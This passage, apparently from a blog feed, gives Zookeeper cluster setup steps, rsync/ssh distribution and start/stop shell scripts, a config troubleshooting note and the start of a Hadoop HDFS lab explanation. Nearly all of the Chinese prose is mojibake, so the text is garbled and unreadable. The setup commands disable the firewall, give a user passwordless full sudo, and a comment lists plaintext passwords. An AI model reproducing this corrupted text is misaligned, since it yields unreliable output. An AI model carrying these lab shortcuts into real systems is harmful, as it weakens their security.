<li><p>æ›´æ–°è¯·æ±‚é¡ºåºæ‰§è¡Œï¼Œæ¥è‡ªåŒä¸€ä¸ªClientçš„æ›´æ–°è¯·æ±‚æŒ‰å…¶å‘é€é¡ºåºä¾æ¬¡æ‰§è¡Œã€‚ </p>
</li>
<li><p>æ•°æ®æ›´æ–°åŸå­æ€§ï¼Œä¸€æ¬¡æ•°æ®æ›´æ–°è¦ä¹ˆæˆåŠŸï¼Œè¦ä¹ˆå¤±è´¥ã€‚ </p>
</li>
<li><p>å®æ—¶æ€§ï¼Œåœ¨ä¸€å®šæ—¶é—´èŒƒå›´å†…ï¼ŒClientèƒ½è¯»åˆ°æœ€æ–°æ•°æ®ã€‚</p>
</li>
</ul>
<p>æ¯ä¸€ä¸ª ZNode é»˜è®¤èƒ½å¤Ÿå­˜å‚¨ 1MB çš„æ•°æ®ï¼Œæ¯ä¸ª ZNode éƒ½å¯ä»¥é€šè¿‡ å…¶è·¯å¾„å”¯ä¸€æ ‡è¯†ã€‚</p>
<h2 id="Zookeeperæœ¬åœ°å®‰è£…"><a href="#Zookeeperæœ¬åœ°å®‰è£…" class="headerlink" title="Zookeeperæœ¬åœ°å®‰è£…"></a>Zookeeperæœ¬åœ°å®‰è£…</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[hmw@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop100</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å…³é—­é˜²ç«å¢™</span></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ systemctl disable firewalld.service</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ›å»ºhuangç”¨æˆ·</span></span><br><span class="line">[hmw@hadoop100 ~]$ useradd huang</span><br><span class="line">[hmw@hadoop100 ~]$ passwd huang</span><br><span class="line"><span class="meta">#</span><span class="language-bash">rootå’Œhmwå¯†ç hmwï¼Œhuangå¯†ç yc</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®hmwç”¨æˆ·å…·æœ‰rootæƒé™</span></span><br><span class="line">[hmw@hadoop100 ~]$ vi /etc/sudoers</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨%wheel  ALL=(ALL) ALLè¿™è¡Œä¸‹é¢æ·»åŠ ä¸€è¡Œ</span> </span><br><span class="line">huang ALL=(ALL) NOPASSWD:ALL</span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿™ä¸€è¡Œä¸è¦ç›´æ¥æ”¾åˆ° root è¡Œä¸‹é¢ï¼Œå› ä¸ºæ‰€æœ‰ç”¨æˆ·éƒ½å±äº wheel ç»„ï¼Œä½ å…ˆé…ç½®äº†huangå…·æœ‰å…å¯†åŠŸèƒ½ï¼Œä½†æ˜¯ç¨‹åºæ‰§è¡Œåˆ°%wheelè¡Œæ—¶ï¼Œè¯¥åŠŸèƒ½åˆè¢«è¦†ç›–å›éœ€è¦å¯†ç ã€‚æ‰€ä»¥huangè¦æ”¾åˆ°%wheelè¿™è¡Œä¸‹é¢ã€‚</span></span><br><span class="line"></span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ mkdir /opt/software</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/module</span><br><span class="line">[hmw@hadoop100 ~]$ chown huang:huang /opt/software</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŸ¥çœ‹è¿™ä¸¤ä¸ªæ–‡ä»¶çš„æ‰€æœ‰è€…å’Œæ‰€æœ‰å±ç»„</span></span><br><span class="line">[hmw@hadoop100 ~]$ cd /opt</span><br><span class="line">[hmw@hadoop100 ~]$ ll</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½è™šæ‹Ÿæœºè‡ªå¸¦çš„JDK</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm-qa:æŸ¥è¯¢æ‰€å®‰è£…çš„æ‰€æœ‰rpmè½¯ä»¶åŒ…</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">grep -i:å¿½ç•¥å¤§å°å†™</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">xargs -n1:è¡¨ç¤ºæ¯æ¬¡åªä¼ é€’ä¸€ä¸ªå‚æ•°</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">rpm -e â€“nodeps:å¼ºåˆ¶å¸è½½è½¯ä»¶</span></span><br><span class="line">[hmw@hadoop100 ~]$ rpm -qa | grep -i java | xargs -n1 rpm -e --nodeps</span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[hmw@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hostname</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hostname</span><br><span class="line">hadoop102</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹hosts</span></span><br><span class="line">[huang@hadoop100 ~]$ vi /etc/hosts</span><br><span class="line">10.211.55.13 hadoop102</span><br><span class="line">10.211.55.14 hadoop103</span><br><span class="line">10.211.55.15 hadoop104</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®å…å¯†ç™»å½•</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®åˆ†å‘è„šæœ¬</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/</span><br><span class="line">[huang@hadoop102 ~]$ mkdir bin</span><br><span class="line">[huang@hadoop102 ~]$ cd bin</span><br><span class="line">[huang@hadoop102 bin]$ vi xsync</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">1. åˆ¤æ–­å‚æ•°ä¸ªæ•°</span> </span><br><span class="line">if [ $# -lt 1 ] </span><br><span class="line">then</span><br><span class="line">		echo Not Enough Arguement!</span><br><span class="line">		exit; </span><br><span class="line">fi</span><br><span class="line"><span class="meta">#</span><span class="language-bash">2. éå†é›†ç¾¤æ‰€æœ‰æœºå™¨</span></span><br><span class="line">for host in hadoop102 hadoop103 hadoop104 </span><br><span class="line">do</span><br><span class="line">	echo ==================== $host ==================== </span><br><span class="line"><span class="meta">	#</span><span class="language-bash">3. éå†æ‰€æœ‰ç›®å½•ï¼ŒæŒ¨ä¸ªå‘é€</span></span><br><span class="line">  for file in $@</span><br><span class="line">  do</span><br><span class="line"><span class="meta">		#</span><span class="language-bash">4. åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨</span> </span><br><span class="line">		if [ -e $file ]</span><br><span class="line">		then</span><br><span class="line">				#5. è·å–çˆ¶ç›®å½•</span><br><span class="line">				pdir=$(cd -P $(dirname $file); pwd)</span><br><span class="line">				#6. è·å–å½“å‰æ–‡ä»¶çš„åç§° </span><br><span class="line">				fname=$(basename $file)</span><br><span class="line">				ssh $host &quot;mkdir -p $pdir&quot;</span><br><span class="line">				rsync -av $pdir/$fname $host:$pdir</span><br><span class="line">    else</span><br><span class="line">        echo $file does not exists!</span><br><span class="line">		fi </span><br><span class="line">	done</span><br><span class="line">done</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä¿®æ”¹è„šæœ¬xsyncå…·æœ‰æ‰§è¡Œæƒé™</span></span><br><span class="line">[huang@hadoop102 bin]$ chmod +x xsync </span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†è„šæœ¬å¤åˆ¶åˆ°/binï¼Œä»¥ä¾¿å…¨å±€è°ƒç”¨</span></span><br><span class="line">[huang@hadoop102 bin]$ sudo cp xsync /bin/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span></span><br><span class="line">[huang@hadoop100 ~]$ reboot</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å®‰è£…jdk</span></span><br><span class="line">huangmingwang@huangmingwangdeMacBook-Pro ~ % scp /Users/huangmingwang/Downloads/jdk-8u212-linux-x64.tar.gz huang@hadoop102:/opt/software/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è§£å‹</span></span><br><span class="line">tar -zxvf jdk-8u212-linux-x64.tar.gz -C /opt/module/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">é…ç½®JDKç¯å¢ƒå˜é‡</span></span><br><span class="line">sudo vi /etc/profile.d/my_env.sh</span><br><span class="line">export JAVA_HOME=/opt/module/jdk1.8.0_212</span><br><span class="line">export PATH=$PATH:$JAVA_HOME/bin</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœç”¨äº†sudoï¼Œé‚£ä¹ˆxsyncä¸€å®šè¦ç»™å®ƒçš„è·¯å¾„è¡¥å…¨</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åŒæ­¥ç¯å¢ƒå˜é‡é…ç½®ï¼ˆrootæ‰€æœ‰è€…ï¼‰</span></span><br><span class="line">sudo ./bin/xsync /etc/profile.d/my_env.sh </span><br><span class="line"><span class="meta">#</span><span class="language-bash">/æ˜¯æŒ‡æ ¹ç›®å½•ï¼šå°±æ˜¯æ‰€æœ‰ç›®å½•æœ€é¡¶å±‚çš„ç›®å½•ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">./è¡¨ç¤ºå½“å‰ç›®å½•ï¼Œ./ ä¸€èˆ¬éœ€è¦å’Œå…¶ä»–æ–‡ä»¶å¤¹æˆ–è€…æ–‡ä»¶ç»“åˆä½¿ç”¨ï¼ŒæŒ‡ä»£å½“å‰ç›®å½•ä¸‹çš„ä¸œè¥¿ã€‚</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®©æ–°çš„ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span></span><br><span class="line">source /etc/profile</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…Zookeeper</span></span><br><span class="line">tar -zxvf apache-zookeeper-3.5.7-bin.tar.gz -C /opt/module/</span><br><span class="line">mv apache-zookeeper-3.5.7-bin/ zookeeper-3.5.7</span><br><span class="line"><span class="meta"># </span><span class="language-bash">/tmp ç›®å½•å­˜çš„æ˜¯ä¸´æ—¶æ•°æ®ï¼Œä¸€ä¸ªæœˆå¯èƒ½ä¼šè¢«åˆ é™¤</span></span><br><span class="line">mkdir zkData</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœ¨/opt/module/zookeeper-3.5.7/zkData ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª myid çš„æ–‡ä»¶</span></span><br><span class="line">vi myid</span><br><span class="line">2</span><br><span class="line"><span class="meta">#</span><span class="language-bash">åŒæ­¥ï¼Œå¹¶åˆ†åˆ«åœ¨ hadoop103ã€hadoop104 ä¸Šä¿®æ”¹ myid æ–‡ä»¶ä¸­å†…å®¹ä¸º 3ã€4</span></span><br><span class="line">xsync zookeeper-3.5.7</span><br><span class="line"></span><br><span class="line">mv zoo_sample.cfg zoo.cfg</span><br><span class="line">vim zoo.cfg</span><br><span class="line">dataDir=/opt/module/zookeeper-3.5.7/zkData</span><br><span class="line"><span class="meta">#</span><span class="language-bash"><span class="comment">######################cluster########################## server.2=hadoop102:2888:3888</span></span></span><br><span class="line">server.3=hadoop103:2888:3888</span><br><span class="line">server.4=hadoop104:2888:3888</span><br><span class="line"></span><br><span class="line">xsync zoo.cfg</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨ï¼ˆ3å°éƒ½è¦å¯åŠ¨ï¼‰</span></span><br><span class="line">bin/zkServer.sh start</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç¼–å†™å¯åŠ¨åœæ­¢è„šæœ¬</span></span><br><span class="line">vim zk.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">case $1 in</span><br><span class="line">&quot;start&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i å¯åŠ¨ ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh start&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;stop&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i åœæ­¢ ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh stop&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">&quot;status&quot;)&#123;</span><br><span class="line">	for i in hadoop102 hadoop103 hadoop104 </span><br><span class="line">	do</span><br><span class="line">		echo ---------- zookeeper $i çŠ¶æ€ ------------</span><br><span class="line">		ssh $i &quot;/opt/module/zookeeper-3.5.7/bin/zkServer.sh status&quot;</span><br><span class="line">	done </span><br><span class="line">&#125;</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line"></span><br><span class="line">chmod u+x zk.sh</span><br><span class="line">zk.sh start</span><br><span class="line">zk.sh stop</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">jpsallè„šæœ¬</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="é€‰ä¸¾æœºåˆ¶"><a href="#é€‰ä¸¾æœºåˆ¶" class="headerlink" title="é€‰ä¸¾æœºåˆ¶"></a>é€‰ä¸¾æœºåˆ¶</h2><p>åº”ç­”æ•°è¶…è¿‡åŠæ•°å°±æ˜¯å›å¤æˆåŠŸ</p>
<h2 id="åˆ†å¸ƒå¼é”"><a href="#åˆ†å¸ƒå¼é”" class="headerlink" title="åˆ†å¸ƒå¼é”"></a>åˆ†å¸ƒå¼é”</h2><p>CountDownLatch åº”ç”¨åœºæ™¯</p>
<p>å…¸å‹çš„åº”ç”¨åœºæ™¯å°±æ˜¯å½“ä¸€ä¸ªæœåŠ¡å¯åŠ¨æ—¶ï¼ŒåŒæ—¶ä¼šåŠ è½½å¾ˆå¤šç»„ä»¶å’ŒæœåŠ¡ï¼Œè¿™æ—¶å€™ä¸»çº¿ç¨‹ä¼šç­‰å¾…ç»„ä»¶å’ŒæœåŠ¡çš„åŠ è½½ã€‚å½“æ‰€æœ‰çš„ç»„ä»¶å’ŒæœåŠ¡éƒ½åŠ è½½å®Œæ¯•åï¼Œä¸»çº¿ç¨‹å’Œå…¶ä»–çº¿ç¨‹åœ¨ä¸€èµ·å®ŒæˆæŸä¸ªä»»åŠ¡ã€‚</p>
<p>CountDownLatch è¿˜å¯ä»¥å®ç°å­¦ç”Ÿä¸€èµ·æ¯”èµ›è·‘æ­¥çš„ç¨‹åºï¼ŒCountDownLatch åˆå§‹åŒ–ä¸ºå­¦ç”Ÿæ•°é‡çš„çº¿ç¨‹ï¼Œé¸£æªåï¼Œæ¯ä¸ªå­¦ç”Ÿå°±æ˜¯ä¸€æ¡çº¿ç¨‹ï¼Œæ¥å®Œæˆå„è‡ªçš„ä»»åŠ¡ï¼Œå½“ç¬¬ä¸€ä¸ªå­¦ç”Ÿè·‘å®Œå…¨ç¨‹åï¼ŒCountDownLatch å°±ä¼šå‡ä¸€ï¼Œç›´åˆ°æ‰€æœ‰çš„å­¦ç”Ÿå®Œæˆåï¼ŒCountDownLatch ä¼šå˜ä¸º 0 ï¼Œæ¥ä¸‹æ¥å†ä¸€èµ·å®£å¸ƒè·‘æ­¥æˆç»©ã€‚</p>
<h4 id="Curatoråˆ†å¸ƒå¼é”æ¡†æ¶"><a href="#Curatoråˆ†å¸ƒå¼é”æ¡†æ¶" class="headerlink" title="Curatoråˆ†å¸ƒå¼é”æ¡†æ¶"></a>Curatoråˆ†å¸ƒå¼é”æ¡†æ¶</h4><h2 id="Paxosç®—æ³•"><a href="#Paxosç®—æ³•" class="headerlink" title="Paxosç®—æ³•"></a>Paxosç®—æ³•</h2><h2 id="Zabç®—æ³•"><a href="#Zabç®—æ³•" class="headerlink" title="Zabç®—æ³•"></a>Zabç®—æ³•</h2><ul>
<li><strong>åºåˆ—åŒ–</strong>ï¼šæŠŠJavaå¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚åºåˆ—ã€‚</li>
<li><strong>ååºåˆ—åŒ–</strong>ï¼šæŠŠå­—èŠ‚åºåˆ—æ¢å¤ä¸ºåŸå…ˆçš„Javaå¯¹è±¡ã€‚</li>
</ul>
<p>ä¼šå­˜åœ¨æœ¬åœ°ç£ç›˜</p>
<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>å¯åŠ¨zookeeperæ—¶ï¼Œæ„Ÿè§‰ä¸€åˆ‡æ­£å¸¸ï¼Œä½†æ˜¯é€šè¿‡zkServer.sh statusæŸ¥çœ‹çŠ¶æ€æ—¶ï¼Œå‘ç°æŠ¥é”™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error contacting service. It is probably not running.</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡æŸ¥çœ‹ zk&#x2F;logsä¸‹çš„æ–‡ä»¶ï¼Œå‘ç°æœ‰å¦‚ä¸‹æŠ¥é”™ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ERROR [main:QuorumPeerMain@86] - Invalid config, exiting abnormally</span><br><span class="line">org.apache.zookeeper.server.quorum.QuorumPeerConfig$ConfigException: Address unresolved: node01:3888 </span><br><span class="line">	at org.apache.zookeeper.server.quorum.QuorumPeer$QuorumServer.&lt;init&gt;(QuorumPeer.java:242)</span><br><span class="line">	at org.apache.zookeeper.server.quorum.flexible.QuorumMaj.&lt;init&gt;(QuorumMaj.java:89)</span><br></pre></td></tr></table></figure>

<h2 id="é”™è¯¯åŸå› "><a href="#é”™è¯¯åŸå› " class="headerlink" title="é”™è¯¯åŸå› "></a>é”™è¯¯åŸå› </h2><p>åœ¨é…ç½®zoo.cfgæ–‡ä»¶æ—¶å€™ï¼Œç«¯å£å·åé¢è¿˜æœ‰ç©ºæ ¼ã€‚å› ä¸ºæ˜¯ä»å…¶ä»–åœ°æ–¹å¤åˆ¶çš„ï¼Œæ‰€ä»¥ä¸å®¹æ˜“å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.0=spark1:2888:3888(æ­¤å¤„æœ‰ç©ºæ ¼)</span><br><span class="line">server.1=spark2:2888:3888</span><br><span class="line">server.2=spark3:2888:3888</span><br></pre></td></tr></table></figure>

<h2 id="è§£å†³åŠæ³•ï¼š"><a href="#è§£å†³åŠæ³•ï¼š" class="headerlink" title="è§£å†³åŠæ³•ï¼š"></a>è§£å†³åŠæ³•ï¼š</h2><p>åˆ æ‰ç«¯å£å·åé¢çš„ç©ºæ ¼å³å¯</p>
<p>æœ‰é—®é¢˜ä¸€å®šè¦å…ˆçœ‹æ—¥å¿—</p>
]]></content>
      <categories>
        <category>å¤§æ•°æ®</category>
      </categories>
      <tags>
        <tag>Zookeeper</tag>
        <tag>å¤§æ•°æ®</tag>
      </tags>
  </entry>
  <entry>
    <title>Lab-4 å¤šç‰©ç†æœºç¯å¢ƒæ­å»º</title>
    <url>/2021/12/22/%E5%A4%A7%E6%95%B0%E6%8D%AE/Lab-4%20%E5%A4%9A%E7%89%A9%E7%90%86%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h1 id="Lab-4-å¤šç‰©ç†æœºç¯å¢ƒæ­å»ºå’Œè¯é¢‘ç»Ÿè®¡-ä¹ä¸ªèŠ‚ç‚¹ï¼Œä¸‰å°ç‰©ç†æœº"><a href="#Lab-4-å¤šç‰©ç†æœºç¯å¢ƒæ­å»ºå’Œè¯é¢‘ç»Ÿè®¡-ä¹ä¸ªèŠ‚ç‚¹ï¼Œä¸‰å°ç‰©ç†æœº" class="headerlink" title="Lab-4 å¤šç‰©ç†æœºç¯å¢ƒæ­å»ºå’Œè¯é¢‘ç»Ÿè®¡(ä¹ä¸ªèŠ‚ç‚¹ï¼Œä¸‰å°ç‰©ç†æœº)"></a>Lab-4 å¤šç‰©ç†æœºç¯å¢ƒæ­å»ºå’Œè¯é¢‘ç»Ÿè®¡(ä¹ä¸ªèŠ‚ç‚¹ï¼Œä¸‰å°ç‰©ç†æœº)</h1><h2 id="ä¸€ã€å®éªŒåŸç†åˆ†æ"><a href="#ä¸€ã€å®éªŒåŸç†åˆ†æ" class="headerlink" title="ä¸€ã€å®éªŒåŸç†åˆ†æ"></a>ä¸€ã€å®éªŒåŸç†åˆ†æ</h2><h3 id="Hadoopæ˜¯ä»€ä¹ˆ"><a href="#Hadoopæ˜¯ä»€ä¹ˆ" class="headerlink" title="Hadoopæ˜¯ä»€ä¹ˆ"></a>Hadoopæ˜¯ä»€ä¹ˆ</h3><p>Hadoopæ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šæ‰€å¼€å‘çš„å¹¶è¡Œè®¡ç®—æ¡†æ¶ä¸åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿã€‚æœ€æ ¸å¿ƒçš„æ¨¡å—åŒ…æ‹¬Hadoop Commonã€HDFSä¸MapReduceã€‚</p>
<h3 id="HDFSæ¶æ„"><a href="#HDFSæ¶æ„" class="headerlink" title="HDFSæ¶æ„"></a>HDFSæ¶æ„</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115381.png" alt="image-20210628203053925"></p>
<h3 id="HDFSæ–‡ä»¶å†™å…¥"><a href="#HDFSæ–‡ä»¶å†™å…¥" class="headerlink" title="HDFSæ–‡ä»¶å†™å…¥"></a>HDFSæ–‡ä»¶å†™å…¥</h3><p>Clientå‘NameNodeå‘èµ·æ–‡ä»¶å†™å…¥çš„è¯·æ±‚ã€‚</p>
<ol>
<li>NameNodeæ ¹æ®æ–‡ä»¶å¤§å°å’Œæ–‡ä»¶å—é…ç½®æƒ…å†µï¼Œè¿”å›ç»™Clientå®ƒæ‰€ç®¡ç†éƒ¨åˆ†DataNodeçš„ä¿¡æ¯ã€‚</li>
<li>Clientå°†æ–‡ä»¶åˆ’åˆ†ä¸ºå¤šä¸ªblockå—ï¼Œå¹¶æ ¹æ®DataNodeçš„åœ°å€ä¿¡æ¯ï¼ŒæŒ‰é¡ºåºå†™å…¥åˆ°æ¯ä¸€ä¸ªDataNodeå—ä¸­ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220112888.png" alt="58qho28cfd"></p>
<p>ä¾‹å¦‚ï¼šæœ‰ä¸€ä¸ªæ–‡ä»¶FileAï¼Œ100Må¤§å°ã€‚Clientå°†FileAå†™å…¥åˆ°HDFSä¸Šã€‚</p>
<ol>
<li>HDFSæŒ‰é»˜è®¤é…ç½®ã€‚</li>
<li>HDFSåˆ†å¸ƒåœ¨ä¸‰ä¸ªæœºæ¶ä¸ŠRack1ï¼ŒRack2ï¼ŒRack3ã€‚</li>
</ol>
<p>æ–‡ä»¶å†™å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š</p>
<ol>
<li>Clientå°†FileAæŒ‰64Måˆ†å—ã€‚åˆ†æˆä¸¤å—ï¼Œblock1å’ŒBlock2;</li>
<li>Clientå‘NameNodeå‘é€å†™æ•°æ®è¯·æ±‚ï¼Œå¦‚å›¾è“è‰²è™šçº¿â‘ â€”â€”&gt;ã€‚</li>
<li>NameNodeèŠ‚ç‚¹ï¼Œè®°å½•blockä¿¡æ¯ã€‚å¹¶è¿”å›å¯ç”¨çš„DataNodeï¼Œå¦‚ç²‰è‰²è™šçº¿â‘¡â€”â€”â€”&gt;ã€‚<ol>
<li>Block1: host2,host1,host3</li>
<li>Block2: host7,host8,host4</li>
<li>åŸç†ï¼š<ol>
<li>NameNodeå…·æœ‰RackAwareæœºæ¶æ„ŸçŸ¥åŠŸèƒ½ï¼Œè¿™ä¸ªå¯ä»¥é…ç½®ã€‚</li>
<li>è‹¥Clientä¸ºDataNodeèŠ‚ç‚¹ï¼Œé‚£å­˜å‚¨blockæ—¶ï¼Œè§„åˆ™ä¸ºï¼šå‰¯æœ¬1ï¼ŒåŒClientçš„èŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬2ï¼Œä¸åŒæœºæ¶èŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬3ï¼ŒåŒç¬¬äºŒä¸ªå‰¯æœ¬æœºæ¶çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å…¶ä»–å‰¯æœ¬éšæœºæŒ‘é€‰ã€‚</li>
<li>è‹¥Clientä¸ä¸ºDataNodeèŠ‚ç‚¹ï¼Œé‚£å­˜å‚¨blockæ—¶ï¼Œè§„åˆ™ä¸ºï¼šå‰¯æœ¬1ï¼Œéšæœºé€‰æ‹©ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å‰¯æœ¬2ï¼Œä¸åŒå‰¯æœ¬1ï¼Œæœºæ¶ä¸Šï¼›å‰¯æœ¬3ï¼ŒåŒå‰¯æœ¬2ç›¸åŒçš„å¦ä¸€ä¸ªèŠ‚ç‚¹ä¸Šï¼›å…¶ä»–å‰¯æœ¬éšæœºæŒ‘é€‰ã€‚</li>
</ol>
</li>
</ol>
</li>
<li>Clientå‘DataNodeå‘é€block1ï¼›å‘é€è¿‡ç¨‹æ˜¯ä»¥æµå¼å†™å…¥ã€‚æµå¼å†™å…¥è¿‡ç¨‹å¦‚ä¸‹ï¼š<ol>
<li>å°†64Mçš„block1æŒ‰64kçš„packageåˆ’åˆ†;</li>
<li>ç„¶åå°†ç¬¬ä¸€ä¸ªpackageå‘é€ç»™host2;</li>
<li>host2æ¥æ”¶å®Œåï¼Œå°†ç¬¬ä¸€ä¸ªpackageå‘é€ç»™host1ï¼ŒåŒæ—¶Clientå‘host2å‘é€ç¬¬äºŒä¸ªpackageï¼›</li>
<li>host1æ¥æ”¶å®Œç¬¬ä¸€ä¸ªpackageåï¼Œå‘é€ç»™host3ï¼ŒåŒæ—¶æ¥æ”¶host2å‘æ¥çš„ç¬¬äºŒä¸ªpackageã€‚</li>
<li>ä»¥æ­¤ç±»æ¨ï¼Œå¦‚å›¾çº¢çº¿å®çº¿æ‰€ç¤ºï¼Œç›´åˆ°å°†block1å‘é€å®Œæ¯•ã€‚</li>
<li>host2,host1,host3å‘NameNodeï¼Œhost2å‘Clientå‘é€é€šçŸ¥ï¼Œè¯´â€œæ¶ˆæ¯å‘é€å®Œäº†â€ã€‚å¦‚å›¾ç²‰çº¢é¢œè‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>Clientæ”¶åˆ°host2å‘æ¥çš„æ¶ˆæ¯åï¼Œå‘NameNodeå‘é€æ¶ˆæ¯ï¼Œè¯´æˆ‘å†™å®Œäº†ã€‚è¿™æ ·å°±çœŸå®Œæˆäº†ã€‚å¦‚å›¾é»„è‰²ç²—å®çº¿</li>
<li>å‘é€å®Œblock1åï¼Œå†å‘host7ã€host8ã€host4å‘é€block2ï¼Œå¦‚å›¾è“è‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>å‘é€å®Œblock2åï¼Œhost7ã€host8ã€host4å‘NameNodeï¼Œhost7å‘Clientå‘é€é€šçŸ¥ï¼Œå¦‚å›¾æµ…ç»¿è‰²å®çº¿æ‰€ç¤ºã€‚</li>
<li>Clientå‘NameNodeå‘é€æ¶ˆæ¯ï¼Œè¯´æˆ‘å†™å®Œäº†ï¼Œå¦‚å›¾é»„è‰²ç²—å®çº¿ã€‚ã€‚ã€‚è¿™æ ·å°±å®Œæ¯•äº†ã€‚</li>
</ol>
</li>
<li>åˆ†æï¼šé€šè¿‡å†™è¿‡ç¨‹ï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°<ol>
<li>å†™1Tæ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦3Tçš„å­˜å‚¨ï¼Œ3Tçš„ç½‘ç»œæµé‡å¸¦å®½ã€‚</li>
<li>åœ¨æ‰§è¡Œè¯»æˆ–å†™çš„è¿‡ç¨‹ä¸­ï¼ŒNameNodeå’ŒDataNodeé€šè¿‡HeartBeatè¿›è¡Œä¿å­˜é€šä¿¡ï¼Œç¡®å®šDataNodeæ´»ç€ã€‚å¦‚æœå‘ç°DataNodeæ­»æ‰äº†ï¼Œå°±å°†æ­»æ‰çš„DataNodeä¸Šçš„æ•°æ®ï¼Œæ”¾åˆ°å…¶ä»–èŠ‚ç‚¹å»ã€‚è¯»å–æ—¶ï¼Œè¦è¯»å…¶ä»–èŠ‚ç‚¹å»ã€‚</li>
